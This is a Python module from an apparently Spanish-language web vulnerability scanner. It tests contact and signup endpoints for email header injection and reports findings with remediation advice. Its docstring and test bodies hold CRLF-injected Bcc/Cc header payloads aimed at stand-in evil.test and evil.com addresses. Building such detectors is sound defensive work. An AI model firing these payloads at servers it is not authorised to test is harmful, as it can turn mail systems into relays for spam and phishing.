"""
modules/email_header.py — Email Header Injection.

Detecta formularios de contacto / signup que pasan input a sendmail() sin
sanitizar. Inyectar CRLF + nuevo header (Bcc:, To:, Subject:) permite que
el atacante use el servidor como relay para spam/phishing.

Técnica:
  email=victim@x.com%0d%0aBcc:attacker@evil.com

Anti-FP:
  - Token único en headers inyectados
  - Comparar baseline (POST normal) vs POST con CRLF: si el servidor 200 OK
    en ambos pero el response menciona "invalid header" en el segundo → seguro
  - Si responde igual en ambos, marcar como POSIBLE (no CRITICAL sin verificar
    que llegó el email).
"""

from __future__ import annotations

import asyncio
import secrets
from urllib.parse import urlparse

from utils.http import AsyncHTTPClient
from utils.vuln import Vuln, make_vuln


_CONTACT_PATHS = [
    "/contact", "/contact-us", "/api/contact", "/feedback", "/api/feedback",
    "/api/email", "/sendmail", "/api/send", "/support",
]


async def run(client: AsyncHTTPClient, url: str) -> list[Vuln]:
    vulns: list[Vuln] = []

    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"

    sem = asyncio.Semaphore(3)

    async def test_endpoint(path: str):
        async with sem:
            target = base.rstrip("/") + path

            # Baseline: POST limpio
            tag_a = secrets.token_hex(4)
            clean_body = {
                "email":   f"test-{tag_a}@example.com",
                "name":    "Test User",
                "message": f"Hello {tag_a}",
                "subject": "Test",
            }
            baseline = await client.post_json(target, clean_body, body_limit=4096)
            if not baseline or baseline.status >= 500:
                return
            if baseline.status in (404, 405, 410):
                return

            # POST inyectado
            tag_b = secrets.token_hex(4)
            injected_body = {
                "email":   f"victim-{tag_b}@example.com\r\nBcc: injected-{tag_b}@evil.test",
                "name":    f"Attacker\r\nCc: cc-{tag_b}@evil.test",
                "message": f"Body content {tag_b}",
                "subject": f"Test\r\nBcc: subject-bcc-{tag_b}@evil.test",
            }
            inj = await client.post_json(target, injected_body, body_limit=4096)
            if not inj:
                return

            # Si el servidor rechaza el CRLF → seguro (típico response 400 con
            # mensaje de error)
            if inj.status >= 400:
                err = inj.text.lower()
                if any(kw in err for kw in ("invalid", "bad request", "header", "crlf")):
                    return  # Backend rechazó correctamente

            # Si ambos responden 200 y el response del inyectado NO menciona
            # filtro de CRLF → probable que el servidor envió el email con
            # headers inyectados (no podemos verificar directamente sin SMTP)
            if baseline.status == inj.status and baseline.status < 400:
                inj_text_lower = inj.text.lower()
                if any(s in inj_text_lower for s in (
                    "thank", "received", "sent", "success", "enviado"
                )):
                    vulns.append(make_vuln(
                        title       = f"Posible Email Header Injection en {path}",
                        severity    = "HIGH",
                        cvss        = 7.5,
                        category    = "Email Header Injection",
                        description = (
                            "El endpoint procesa CR/LF en campos enviados a la API de email "
                            "sin rechazar la inyección. Atacante puede usar el servidor como "
                            "relay para spam/phishing inyectando Bcc:, Cc:, From:."
                        ),
                        evidence    = (
                            f"POST {target}\n"
                            f"Baseline (limpio): HTTP {baseline.status}\n"
                            f"Inyección CRLF + Bcc en email/name/subject: HTTP {inj.status}\n"
                            f"Servidor confirmó envío sin rechazar el CRLF\n"
                            f"Verificar manualmente que llegó email a 'injected-{tag_b}@...'"
                        ),
                        fix         = (
                            "Rechazar CR (\\r), LF (\\n) y comas en cualquier campo "
                            "incluido en headers SMTP (To, From, CC, BCC, Subject). "
                            "Usar librerías como Python email.utils.parseaddr y validar "
                            "que devuelve exactamente 1 dirección sin newlines."
                        ),
                        ref         = "https://owasp.org/www-community/vulnerabilities/Email_Header_Injection",
                        module      = "email_header",
                        url         = target,
                        cwe         = "CWE-93",
                        confidence  = 65,
                    ))

    await asyncio.gather(*[test_endpoint(p) for p in _CONTACT_PATHS])
    return vulns
